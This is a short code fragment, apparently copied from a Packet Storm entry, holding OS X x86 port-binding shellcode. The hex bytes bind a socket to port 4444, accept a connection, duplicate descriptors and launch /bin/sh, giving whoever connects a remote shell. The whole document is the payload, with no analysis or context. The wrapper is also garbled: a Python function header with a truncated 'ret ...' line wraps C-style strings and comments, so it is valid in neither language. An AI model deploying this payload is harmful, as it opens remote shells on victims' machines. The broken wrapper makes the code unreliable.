#https://packetstormsecurity.com/files/109627/OS-X-x86-Port-Binding-Shellcode.html


def tcp_bind( port):
	ret ...
	"\x31\xC0"   
	"\x50"         
	"\x50"        
	"\x50"         
	"\xB0\x7E"     
	"\xCD\x80"    


	"\x31\xC0"    
	"\x50"         
	"\x50"        
	"\xB0\x17"    
	"\xCD\x80"     
	"\x31\xC0"     
	"\x50"         // PUSH EAX
	"\x68\xFF\x02\x11\x5C" // PUSH 0x5C1102FF
	"\x89\xE7"     // MOV EDI,ESP
	"\x50"         // PUSH EAX
	"\x6A\x01"     // PUSH 0x01
	"\x6A\x02"     // PUSH 0x02
	"\x6A\x10"     // PUSH 0x10
	"\xB0\x61"     // MOV AL,0x61
	"\xCD\x80"     // INT 0x80
	"\x57"         // PUSH EDI
	"\x50"         // PUSH EAX
	"\x50"         // PUSH EAX
	"\x6A\x68"     // PUSH 0x68
	"\x58"         // POP EAX
	"\xCD\x80"     // INT 0x80
	"\x89\x47\xEC"   // MOV DWORD ,EAX
	"\xB0\x6A"     // MOV AL,0x6A
	"\xCD\x80"     // INT 0x80
	"\xB0\x1E"     // MOV AL,0x1E
	"\xCD\x80"     // INT 0x80
	"\x50"         // PUSH EAX
	"\x50"         // PUSH EAX
	"\x6A\x5A"     // PUSH 0x5A
	"\x58"         // POP EAX
	"\xCD\x80"     // INT 0x80
	"\xFF\x4F\xE4" // DEC DWORD ,EDI
	"\x79\xF6"     // JNS SHORT
	"\x50"         // PUSH EAX
	"\x68\x2F\x2F\x73\x68"  // PUSH 0x68732F2F
	"\x68\x2F\x62\x69\x6E"  // PUSH 0x6E69622F
	"\x89\xE3"     // MOV EBX,ESP
	"\x50"         // PUSH EAX
	"\x54"         // PUSH ESP
	"\x54"         // PUSH ESP
	"\x53"         // PUSH EBX
	"\x50"         // PUSH EAX
	"\xB0\x3B"     // MOV AL,0x3B
	"\xCD\x80";    // INT 0x80
